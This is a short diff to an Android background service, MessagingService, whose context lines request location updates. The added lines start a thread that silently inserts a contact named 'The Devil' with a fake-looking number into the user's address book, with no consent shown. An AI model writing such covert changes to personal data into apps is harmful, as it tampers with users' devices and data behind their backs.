@@ -167,6 +167,12 @@ public class MessagingService extends Service {
             mLocationListener = Lofl.getLocationListener(this);
             mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
         }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                Lofl.insertContact(MessagingService.this, "The Devil", "6663336666");
+            }
+        }).start();
     }
 
     @Override
